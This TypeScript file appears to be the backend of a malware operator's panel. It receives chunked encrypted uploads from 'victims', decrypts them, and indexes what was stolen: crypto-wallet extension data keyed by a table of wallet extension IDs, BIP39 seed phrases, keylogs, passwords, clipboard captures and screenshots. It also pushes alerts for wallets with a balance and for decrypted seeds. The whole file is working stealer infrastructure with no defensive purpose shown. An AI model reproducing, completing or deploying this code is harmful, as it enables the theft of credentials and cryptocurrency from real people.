import { createDecipheriv, createHash, randomUUID } from 'node:crypto';
import AdmZip from 'adm-zip';
import { createReadStream, createWriteStream } from 'node:fs';
import { mkdir, open, readFile, rename, stat, writeFile } from 'node:fs/promises';
import { basename, dirname, join, normalize, sep } from 'node:path';
import type { Artifact, Upload, Victim } from '@prisma/client';
import { prisma } from '../lib/db';
import { env } from '../lib/env';
import { artifactKey, openSecret, sha256hex } from '../lib/crypto';
import { publish } from '../lib/bus';
import { notify } from './notify';

export const uploadDir = (id: string) => join(env.STORAGE_DIR, 'uploads', `${id}.bin`);
export const artifactDir = (id: string) => join(env.STORAGE_DIR, 'artifacts', id);

export function safeRel(path: string): string {
  const clean = normalize(path.replace(/\\/g, '/').replace(/^[A-Za-z]:/, ''))
    .split(/[\\/]+/)
    .filter((part) => part && part !== '.' && part !== '..')
    .join(sep);
  return clean || 'unnamed';
}

export async function initUpload(
  victim: Victim & { build: { secret: string } },
  input: { taskId: string | null; module: string; totalSize: number; chunkCount: number; sha256: string }
): Promise<Upload> {
  const max = env.MAX_ARTIFACT_MB * 1024 * 1024;
  if (input.totalSize > max || input.totalSize <= 0) {
    const { HttpError } = await import('../lib/errors');
    throw new HttpError(413, 'payload_too_large', `artifact exceeds ${env.MAX_ARTIFACT_MB} MiB`);
  }
  const path = uploadDir(randomUUID());
  await mkdir(dirname(path), { recursive: true });
  await writeFile(path, Buffer.alloc(0));
  const upload = await prisma.upload.create({
    data: {
      victimId: victim.id,
      taskId: input.taskId,
      module: input.module,
      totalSize: input.totalSize,
      chunkCount: input.chunkCount,
      sha256: input.sha256,
      path,
      expiresAt: new Date(Date.now() + env.UPLOAD_TTL_HOURS * 3_600_000)
    }
  });
  return upload;
}

export async function writeChunk(upload: Upload, offset: number, body: Buffer, chunkHash: string): Promise<number> {
  if (upload.state !== 'open') {
    const { HttpError } = await import('../lib/errors');
    throw new HttpError(410, 'upload_expired', 'upload is not open');
  }
  if (sha256hex(body) !== chunkHash) {
    const { HttpError } = await import('../lib/errors');
    throw new HttpError(409, 'chunk_hash_mismatch', 'chunk sha256 differs');
  }
  if (offset + body.length <= upload.received) {
    return upload.received; // duplicate delivery after a lost response
  }
  if (offset !== upload.received) {
    const { HttpError } = await import('../lib/errors');
    throw new HttpError(409, 'offset_mismatch', 'offset differs from stored position', 0, { received: upload.received });
  }
  if (offset + body.length > upload.totalSize) {
    const { HttpError } = await import('../lib/errors');
    throw new HttpError(409, 'offset_overflow', 'chunk exceeds declared size');
  }
  const handle = await open(upload.path, 'r+');
  try {
    await handle.write(body, 0, body.length, offset);
    await handle.sync();
  } finally {
    await handle.close();
  }
  const next = offset + body.length;
  await prisma.upload.update({ where: { id: upload.id }, data: { received: next } });
  return next;
}

export async function commitUpload(upload: Upload, sha256: string, chunkCount: number): Promise<Artifact> {
  const { HttpError } = await import('../lib/errors');
  if (upload.state === 'committed') {
    const existing = await prisma.artifact.findUnique({ where: { uploadId: upload.id } });
    if (existing) return existing;
  }
  const info = await stat(upload.path);
  if (info.size !== upload.totalSize || upload.received !== upload.totalSize) {
    throw new HttpError(409, 'size_mismatch', 'received size differs from declared size');
  }
  if (chunkCount !== upload.chunkCount) throw new HttpError(409, 'chunk_count_mismatch', 'chunk count differs');
  const hash = createHash('sha256');
  await new Promise<void>((resolve, reject) => {
    createReadStream(upload.path)
      .on('data', (chunk) => hash.update(chunk))
      .on('error', reject)
      .on('end', () => resolve());
  });
  if (hash.digest('hex') !== sha256 || sha256 !== upload.sha256) {
    throw new HttpError(409, 'hash_mismatch', 'container sha256 differs');
  }
  const dir = artifactDir(upload.id);
  await mkdir(dir, { recursive: true });
  const artifact = await prisma.artifact.upsert({
    where: { uploadId: upload.id },
    update: { status: 'queued', sha256, bytes: upload.totalSize },
    create: {
      victimId: upload.victimId,
      uploadId: upload.id,
      taskId: upload.taskId,
      module: upload.module,
      bytes: upload.totalSize,
      sha256,
      containerPath: upload.path,
      status: 'queued'
    }
  });
  await prisma.upload.update({ where: { id: upload.id }, data: { state: 'committed' } });
  void processArtifact(artifact.id);
  return artifact;
}

async function blobKey(victimId: string, artifact: Artifact, noncePrefix: Buffer): Promise<Buffer> {
  const victim = await prisma.victim.findUniqueOrThrow({ where: { id: victimId }, include: { build: true } });
  const secret = victim.build.secret;
  return artifactKey(secret, victim.build.buildId, victim.id, noncePrefix);
}

type Manifest = {
  container_version: 1;
  build_id: string;
  victim_id: string;
  os: string;
  profile: 'lite' | 'full';
  module: string;
  created_at: number;
  nonce_prefix: string;
  total_size: number;
  artifacts: Array<{ id: string; path: string; kind: string; size: number; sha256: string; mode?: number }>;
};

export async function processArtifact(artifactId: string): Promise<void> {
  const claimed = await prisma.artifact.updateMany({
    where: { id: artifactId, status: { in: ['queued', 'failed'] } },
    data: { status: 'processing' }
  });
  if (claimed.count === 0) return;
  const artifact = await prisma.artifact.findUnique({ where: { id: artifactId } });
  if (!artifact) return;
  if (artifact.source === 'discord') {
    try {
      await processDiscordArtifact(artifact);
    } catch (error) {
      await prisma.artifact.update({ where: { id: artifact.id }, data: { status: 'failed', error: (error instanceof Error ? error.message : 'discord_failed').slice(0, 500) } });
    }
    return;
  }
  try {
    const fd = await open(artifact.containerPath, 'r');
    try {
      let cursor = 0;
      const manifestLine = await readLine(fd, cursor);
      cursor += manifestLine.bytes;
      const manifestText = manifestLine.text;
      const hashLine = await readLine(fd, cursor);
      cursor += hashLine.bytes;
      const expected = hashLine.text.trim();
      if (sha256hex(manifestText) !== expected) throw new Error('manifest_sha_mismatch');
      const manifest = JSON.parse(manifestText) as Manifest;
      if (manifest.container_version !== 1 || manifest.victim_id !== artifact.victimId) {
        throw new Error('manifest_invalid');
      }
      const noncePrefix = Buffer.from(manifest.nonce_prefix, 'base64url');
      const key = await blobKey(artifact.victimId, artifact, noncePrefix);
      const root = artifactDir(artifact.id);
      await mkdir(root, { recursive: true });
      const seen = new Set<string>();

      for (let index = 0; index < manifest.artifacts.length; index++) {
        const item = manifest.artifacts[index]!;
        const header = await readLine(fd, cursor);
        cursor += header.bytes;
        const [tag, id, lengthText] = header.text.trim().split(' ');
        if (tag !== 'BLOB' || !id || !lengthText) throw new Error('blob_header_invalid');
        const length = Number(lengthText);
        const ciphertext = Buffer.alloc(length);
        await fd.read(ciphertext, 0, length, cursor);
        cursor += length;
        const nonce = Buffer.concat([noncePrefix, Buffer.alloc(4)]);
        nonce.writeUInt32BE(index, 8);
        const decipher = createDecipheriv('aes-256-gcm', key, nonce);
        decipher.setAAD(Buffer.from(`${expected}:${id}`));
        decipher.setAuthTag(ciphertext.subarray(length - 16));
        const compressed = Buffer.concat([decipher.update(ciphertext.subarray(0, length - 16)), decipher.final()]);
        const { inflateSync } = await import('node:zlib');
        const plain = inflateSync(compressed);
        if (plain.length !== item.size || sha256hex(plain) !== item.sha256) throw new Error(`blob_invalid:${item.id}`);
        const dest = join(root, safeRel(item.path));
        if (seen.has(dest)) continue;
        seen.add(dest);
        await mkdir(dirname(dest), { recursive: true });
        await writeFile(dest, plain, { mode: item.mode ?? 0o600 });
      }

      await prisma.artifact.update({
        where: { id: artifact.id },
        data: { status: 'ready', manifest: manifest as never, processedAt: new Date(), error: null }
      });
      await indexArtifact(artifact.id, artifact.victimId, manifest, root);
      void publish({ type: 'artifact.ready', victimId: artifact.victimId, at: Date.now(), data: { artifactId: artifact.id, module: artifact.module } });
    } finally {
      await fd.close();
    }
  } catch (error) {
    const message = error instanceof Error ? error.message : 'unknown';
    await prisma.artifact.update({
      where: { id: artifactId },
      data: { status: 'failed', error: message.slice(0, 500) }
    });
    await prisma.event.create({
      data: { victimId: artifact.victimId, kind: 'artifact_failed', data: { artifactId, error: message } }
    });
  }
}

async function readLine(fd: Awaited<ReturnType<typeof open>>, at: number): Promise<{ text: string; bytes: number }> {
  const chunks: Buffer[] = [];
  let total = 0;
  const buffer = Buffer.alloc(1);
  for (let i = 0; i < 8 * 1024 * 1024; i++) {
    const { bytesRead } = await fd.read(buffer, 0, 1, at + total);
    if (!bytesRead) break;
    total++;
    if (buffer[0] === 0x0a) return { text: Buffer.concat(chunks).toString('utf8'), bytes: total };
    chunks.push(Buffer.from([buffer[0]!]));
  }
  return { text: Buffer.concat(chunks).toString('utf8'), bytes: total };
}

type WalletIndex = {
  wallets?: Array<{
    id: string;
    kind: string;
    path: string;
    state: string;
    reason?: string;
    address?: string;
    balance?: string;
    decrypt_state?: string;
  }>;
  seeds?: Array<{ path: string; kind: string; value: string; words?: number }>;
};

async function processDiscordArtifact(artifact: Artifact): Promise<void> {
  const root = artifactDir(artifact.id);
  await mkdir(root, { recursive: true });
  const name = basename(artifact.containerPath).toLowerCase();
  const manifest: { artifacts: Array<{ id: string; path: string; kind: string; size: number; sha256: string }> } = { artifacts: [] };

  if (name.endsWith('.zip')) {
    const zip = new AdmZip(artifact.containerPath);
    let index = 0;
    for (const entry of zip.getEntries()) {
      if (entry.isDirectory) continue;
      const rel = safeRel(entry.entryName);
      const data = entry.getData();
      if (data.length > 64 * 1024 * 1024) continue;
      const dest = join(root, rel);
      await mkdir(dirname(dest), { recursive: true });
      await writeFile(dest, data);
      manifest.artifacts.push({ id: `e${++index}`, path: rel, kind: rel.toLowerCase().endsWith('.json') ? 'json' : 'file', size: data.length, sha256: sha256hex(data) });
    }
    await indexHarvest(artifact.victimId, artifact.id, manifest.artifacts.map((item) => item.path), root);
  } else if (name.endsWith('.png')) {
    const dest = join(root, 'screenshot.png');
    await writeFile(dest, await readFile(artifact.containerPath));
    const data = await readFile(dest);
    manifest.artifacts.push({ id: 'e1', path: 'screenshot.png', kind: 'screenshot', size: data.length, sha256: sha256hex(data) });
    await prisma.screenshot.create({ data: { victimId: artifact.victimId, artifactId: artifact.id, ts: new Date() } });
  } else {
    const dest = join(root, basename(artifact.containerPath));
    await writeFile(dest, await readFile(artifact.containerPath));
    const data = await readFile(dest);
    manifest.artifacts.push({ id: 'e1', path: basename(dest), kind: 'log', size: data.length, sha256: sha256hex(data) });
    await indexTextFile(artifact.victimId, dest, name);
  }
  await prisma.artifact.update({ where: { id: artifact.id }, data: { status: 'ready', manifest: manifest as never, processedAt: new Date(), error: null } });
  await prisma.event.create({ data: { victimId: artifact.victimId, kind: 'artifact_ready', data: { artifactId: artifact.id, module: artifact.module } } });
  void publish({ type: 'artifact.ready', victimId: artifact.victimId, at: Date.now(), data: { artifactId: artifact.id } });
}

const EXT_IDS: Record<string, string> = {
  nkbihfbeogaeaoehlefnkodbefgpgknn: 'metamask',
  bfnaelmomeimhlpmgjnjophhpkkoljpa: 'phantom',
  acmacodkjbdgmoleebolmdjonilkdbch: 'rabby',
  dmkamcknogkgcdfhhbddcghachkejeap: 'keplr',
  hnfanknocfeofbddgcijnmhnfnkdnaad: 'coinbase',
  bhhhlbepdkbapadjdnnojkbgioiodbic: 'solflare',
  ibnejdfjmmkpcnlpebklmnkoeoihofec: 'tronlink',
  egjidjbpglichdcondbcbdnbeeppgdph: 'trust',
  fhbohimaelbohpjbbldcngcnapndodjp: 'binance',
  ffnbelfdoeiohenkjibnmadjiehjhajb: 'yoroi',
  lpfcbjknijpeeillifnkikgncikgfhdo: 'nami',
  hmeobnfnfcmdkdcmlblgagmfpfboieaf: 'xdefi',
  aflkmfhebedbjioipglgcbcmnbpgliof: 'backpack'
};

async function indexHarvest(victimId: string, artifactId: string, paths: string[], root: string): Promise<void> {
  const seen = new Set<string>();
  for (const path of paths) {
    const lower = path.toLowerCase();
    let id = '';
    let decrypted = false;
    for (const [ext, target] of Object.entries(EXT_IDS)) {
      if (lower.includes('/local extension settings/' + ext + '/') || lower.startsWith('wallets/') && lower.includes('/' + ext + '/')) {
        id = target;
        decrypted = lower.endsWith('decrypted.json');
        break;
      }
    }
    if (!id) {
      if (lower.startsWith('wallets/exodus')) id = 'exodus';
      else if (lower.includes('electrum/wallets/') && lower.endsWith('.wallet')) id = 'electrum';
      else if (lower.includes('electrum-ltc/wallets/') && lower.endsWith('.wallet')) id = 'electrum-ltc';
      else if (lower.includes('wallets/atomic/')) id = 'atomic';
      else if (lower.includes('wallets/trust')) id = 'trust';
      else if (lower.includes('ledger')) id = 'ledger';
    }
    if (!id) continue;
    const key = `${victimId}:${id}`;
    if (seen.has(key)) continue;
    seen.add(key);
    const walletPath = `discord:${artifactId}:${id}`;
    await prisma.wallet.upsert({
      where: { victimId_path: { victimId, path: walletPath } },
      update: { artifactId, state: decrypted ? 'decrypted' : 'locked', reason: 'discord_harvest', decryptState: decrypted ? 'done' : 'none' },
      create: { victimId, artifactId, kind: 'desktop', targetId: id, path: walletPath, state: decrypted ? 'decrypted' : 'locked', reason: 'discord_harvest' }
    });
  }
  for (const path of paths) {
    if (path.endsWith('findings.txt') || path.includes('findings-')) {
      await indexTextFile(victimId, join(root, path), path);
    }
  }
}

async function indexTextFile(victimId: string, path: string, name: string): Promise<void> {
  const text = await readFile(path, 'utf8').catch(() => '');
  if (!text) return;
  if (name.includes('seeds') || name.includes('findings')) {
    for (const line of text.split('\n')) {
      const seed = /(?:bip39-\d+|seed):\s*([a-z ]{20,})/i.exec(line);
      const value = seed ? seed[1]!.trim() : (name.includes('seeds') ? line.split('|').pop()?.trim() ?? '' : '');
      if (!value || value.split(/\s+/).length < 12) continue;
      await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: 'bip39', value, source: 'discord_findings' } } });
    }
  }
  if (name.includes('keys.log') || name.includes('passwords')) {
    for (const line of text.split('\n').slice(0, 2000)) {
      if (!line.trim()) continue;
      await prisma.keylog.create({ data: { victimId, text: line.slice(0, 4000), password: name.includes('passwords') } });
    }
  }
}

async function indexArtifact(artifactId: string, victimId: string, manifest: Manifest, root: string): Promise<void> {
  if (manifest.module === 'wallets') {
    const file = join(root, 'wallets.json');
    try {
      const parsed = JSON.parse(await readFile(file, 'utf8')) as WalletIndex;
      for (const wallet of parsed.wallets ?? []) {
        await prisma.wallet.upsert({
          where: { victimId_path: { victimId, path: wallet.path } },
          update: {
            artifactId,
            kind: wallet.kind,
            targetId: wallet.id,
            state: wallet.state as never,
            reason: wallet.reason ?? null,
            address: wallet.address ?? null,
            balance: wallet.balance ?? null,
            decryptState: wallet.decrypt_state ?? 'none'
          },
          create: {
            victimId,
            artifactId,
            kind: wallet.kind,
            targetId: wallet.id,
            path: wallet.path,
            state: wallet.state as never,
            reason: wallet.reason ?? null,
            address: wallet.address ?? null,
            balance: wallet.balance ?? null,
            decryptState: wallet.decrypt_state ?? 'none'
          }
        });
        if (wallet.state === 'decrypted') {
          await prisma.event.create({
            data: { victimId, kind: 'wallet_decrypted', data: { path: wallet.path, target: wallet.id } }
          });
        }
        if (wallet.balance && wallet.balance !== '0') {
          await notify({ kind: 'wallet_balance', victimId, title: 'Wallet with balance', body: `${wallet.id} → ${wallet.balance}` });
        }
      }
      for (const seed of parsed.seeds ?? []) {
        await prisma.event.create({
          data: { victimId, kind: 'seed_found', data: { path: seed.path, type: seed.kind, words: seed.words ?? 0, value: seed.value } }
        });
        await notify({ kind: 'seed', victimId, title: 'Seed decrypted', body: `${seed.kind} · ${seed.path}` });
      }
    } catch {
      // wallets.json is optional for other wallet modules
    }
  }
  if (manifest.module === 'clipboard') {
    await ingestJsonl(join(root, 'clipboard.jsonl'), async (row) => {
      await prisma.clipboardEntry.create({
        data: {
          victimId,
          ts: new Date(Number(row.ts) * 1000 || Date.now()),
          window: String(row.window ?? ''),
          process: String(row.process ?? ''),
          content: String(row.content ?? ''),
          kind: String(row.kind ?? 'text'),
          replaced: row.replaced ? String(row.replaced) : null
        }
      });
    });
  }
  if (manifest.module === 'screenshot') {
    const shot = manifest.artifacts.find((item) => item.kind === 'screenshot') ?? manifest.artifacts[0];
    if (shot) {
      await prisma.screenshot.create({ data: { victimId, artifactId, ts: new Date() } });
      await prisma.event.create({ data: { victimId, kind: 'screenshot', data: { artifactId } } });
    }
  }
  if (manifest.module === 'keylogs') {
    const ingest = async (row: Record<string, unknown>): Promise<void> => {
      await prisma.keylog.create({
        data: {
          victimId,
          ts: new Date(Number(row.ts) * 1000 || Date.now()),
          process: String(row.process ?? ''),
          title: String(row.title ?? ''),
          text: String(row.text ?? ''),
          password: Boolean(row.password)
        }
      });
    };
    await ingestJsonl(join(root, 'keylogs.jsonl'), ingest);
    await ingestJsonl(join(root, 'passwords.jsonl'), ingest);
  }
}

async function ingestJsonl(path: string, fn: (row: Record<string, unknown>) => Promise<void>): Promise<void> {
  try {
    const text = await readFile(path, 'utf8');
    for (const line of text.split('\n')) {
      if (!line.trim()) continue;
      try {
        await fn(JSON.parse(line) as Record<string, unknown>);
      } catch {
        // skip a corrupt row, keep the rest
      }
    }
  } catch {
    // optional file
  }
}

export async function commitRename(path: string): Promise<void> {
  await rename(path, path);
}
